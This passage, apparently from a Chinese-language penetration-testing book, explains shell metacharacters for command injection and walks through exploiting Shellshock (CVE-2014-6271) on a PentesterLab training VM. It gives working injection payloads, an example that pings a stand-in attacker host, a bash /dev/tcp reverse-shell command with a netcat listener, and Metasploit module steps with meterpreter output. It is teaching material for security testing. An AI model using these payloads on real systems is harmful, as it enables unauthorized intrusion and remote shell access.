

开发者可能会设置过滤器来阻止分号元字符。这将阻止你的注入数据，因此你需要尝试其他元字符，如下表所示：

| Symbol | Usage |
|---|---|
| ; | 分号是最常用的用于测试注入漏洞的元字符。shell 会按分号分隔依次运行所有命令。 |
| && | 双与号仅在左侧命令执行成功时才运行元字符右侧的命令。一个例子是注入密码字段以及正确的凭据。可以在用户通过系统身份验证后运行的命令被注入。 |
| || | 双竖线元字符与双与号正好相反。它仅在左侧命令失败时才运行右侧的命令。以下是此命令的一个示例：`cd invalidDir || ping -c 2 attacker.com` |
| ( ) | 使用分组元字符，你可以将多个命令的输出合并并存储到文件中。以下是此命令的一个示例：`(ps; netstat) > running.txt` |
| ` | 单引号元字符用于强制 shell 对反引号之间的命令进行解释并运行。以下是此命令的一个示例：`Variable= "OS version `uname -a`" && echo $variable` |
| >> | 该字符会将左侧命令的输出追加到右侧字符命名的文件中。以下是此命令的一个示例：`ls -la >> listing.txt` |
| | | 单竖线会将左侧命令的输出用作右侧指定命令的输入。以下是此命令的一个示例：`netstat -an | grep :22` |

作为攻击者，你通常需要使用上述元字符的组合来绕过开发者设置的过滤器，以便使你的命令被注入。

## 利用 shellshock

**shellshock** 漏洞于 2014 年 9 月被发现，并被分配了初始 CVE 标识符 2014-6271。Shellshock 是一种 **任意代码执行 (ACE)** 漏洞，被认为是有史以来发现的最严重漏洞之一。

该漏洞发现于 **Bourne Again Shell (bash)** 处理环境变量的方式中，它影响了使用 bash 作为操作系统接口的各种应用程序和操作系统。受影响的代码包括大多数基于 Unix 的系统（包括 Mac OS X）中的 DHCP 客户端、命令行终端以及 Web 应用程序中的 CGI 脚本。该漏洞在环境变量中设置空函数时被触发。空函数如下所示：

```
() { :; };
```

当 bash shell 收到上述字符集连同变量时，它不会拒绝这些字符串，而是连同其后的变量一起接受并在服务器上作为命令执行。

正如你在之前利用命令注入漏洞时所看到的，bash shell 在 Web 应用程序中被广泛使用，你经常会看到后端、中间件和监控 Web 应用程序将变量传递给 bash shell 以执行某些任务。下面使用来自 PentesterLab 的易受攻击的 live CD（https://www.pentesterlab.com/exercises/cve-2014-6271）展示了 shellshock 漏洞的一个示例。

## 获取反向 shell

如果你使用 live CD 镜像启动虚拟机，你将拥有一个最小系统，其中包含一个 Web 服务器，该服务器加载一个非常简单的页面，显示系统信息：

![](img/6b6e557533100c0e47951d0e5e14c4ee_205_0.png)

如果你查看代理中的请求，你会注意到对 /cgi-bin/status 的请求，其响应包括系统的正常运行时间和看起来像是 uname -a 命令的结果：

![](img/6b6e557533100c0e47951d0e5e14c4ee_205_1.png)

要获取此类信息，status 脚本需要与操作系统通信。有可能它正在使用 bash，因为 bash 是许多基于 Unix 系统的默认 shell，并且 User-Agent 头在 CGI 脚本处理时会变成环境变量。为了测试是否真的存在命令注入，你需要测试不同版本的注入。假设你希望目标服务器 ping 回你以验证它是否正在执行命令。以下是使用通用目标地址的一些示例。请注意空格和分隔符的使用：

```
 () { :;}; ping -c 1 192.168.1.1
 () { :;}; /bin/ping -c 1 192.168.1.1
 () { :;}; bash -c "ping -c 1 192.168.1.1"
 () { :;}; /bin/bash -c "ping -c 1 attacker.com"
 () { :;}; /bin/sh -c "ping -c 1 192.168.1.1"
```

作为测试的一部分，你将请求发送到 Burp Suite 的 Repeater 并仅在 User-Agent 头中提交 () { :;}; 空函数，并得到与未注入时相同的有效响应：

![](img/6b6e557533100c0e47951d0e5e14c4ee_206_0.png)

如果你尝试注入诸如 uname、id 或单个 ping 之类的命令，你会收到错误。这意味着该头确实正在被处理，你只需要找到正确发送命令的方法：

![](img/6b6e557533100c0e47951d0e5e14c4ee_207_0.png)

经过一些反复试验后，你找到了正确的命令。ping -c 1 10.7.7.4 命令将在服务器上执行，并且 ping 会通过诸如 Wireshark 之类的网络嗅探器在攻击者机器上被捕获：

![](img/6b6e557533100c0e47951d0e5e14c4ee_207_1.png)

现在你找到了正确的注入命令，你可以尝试获得对服务器的直接 shell 访问。为此，首先使用以下方式设置你的监听器：

```
nc -lvp 12345
```

然后注入命令。这次，你注入的是更高级的命令，如果成功将产生一个完全交互式的 shell：

```
() { :;}; /bin/bash -c "ping -c 1 10.7.7.4; bash -i >& /dev/tcp/10.7.7.4/12345 0>&1"
```

![](img/6b6e557533100c0e47951d0e5e14c4ee_208_0.png)

bash shell 将变量解释为命令并执行它，而不是将其接受为字符序列。这看起来非常类似于前面讨论的命令注入漏洞。然而，这里的主要区别是 bash shell 本身容易受到代码注入的影响，而不是网站。由于 bash shell 被许多应用程序使用，例如 DHCP、SSH、SIP 和 SMTP，攻击面因此大大增加。通过 HTTP 请求利用该漏洞仍然是最常见的方式，因为 bash shell 通常与 CGI 脚本一起使用。

![](img/6b6e557533100c0e47951d0e5e14c4ee_208_1.png)

要识别 Web 服务器中的 CGI 脚本，除了使用代理分析请求和响应外，还可以使用 Nikto 和 DIRB。

## 使用 Metasploit 进行利用

从终端启动 Metasploit 控制台（msfconsole）。你需要在 exploit/multi/http 下选择 apache_mod_cgi_bash_env_exec 漏洞利用模块：

```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

然后你需要使用 set 命令定义远程主机和目标 URI 值。你还需要选择 reverse_tcp 有效载荷，该有效载荷将使 Web 服务器连接到攻击者机器。这可以在 linux | x86 | meterpreter 中找到。

确保本地主机（SRVHOST）和本地端口（SRVPORT）值正确。你可以使用 set 命令设置这些和其他值：

```
set SRVHOST 0.0.0.0
set SRVPORT 8080
```

使用 0.0.0.0 主机，服务器将通过攻击者启用的所有网络接口进行监听。此外，验证攻击者机器上所选端口上没有正在运行的服务：

![](img/6b6e557533100c0e47951d0e5e14c4ee_209_0.png)

准备就绪后，输入 `exploit`，如果服务器容易受到 shellshock 攻击，你将被 `meterpreter` 提示符迎接。*shell 是黑客最宝贵的财产。* `meterpreter` 会话在后利用阶段是一个非常有用的工具。在此阶段，黑客真正理解了他们所入侵的机器的价值。Meterpreter 拥有大量内置命令。

Meterpreter 是 Metasploit 中包含的高级远程 shell。当在 Windows 系统中执行时，它包含用于提升权限、转储密码和密码哈希、冒充用户、嗅探网络流量、记录击键以及在目标机器上执行许多其他漏洞利用的模块。

以下屏幕截图显示了 `sysinfo` 命令的输出以及 Meterpreter 中的远程系统 shell：

```
msf exploit(apache_mod_cgi_bash_env_exec) > exploit
[*] Started reverse TCP handler on 10.7.7.4:4444
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (826872 bytes) to 10.7.7.5
[*] Meterpreter session 2 opened (10.7.7.4:4444 -> 10.7.7.5:35130) at 20
meterpreter > sysinfo
Computer     : 10.7.7.5
OS           : (Linux 3.14.1-pentesterlab)
Architecture : i686
Meterpreter  : x86/linux
meterpreter > shell
Process 1355 created.
Channel 1 created.
whoami
pentesterlab
uname -a
Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014
```

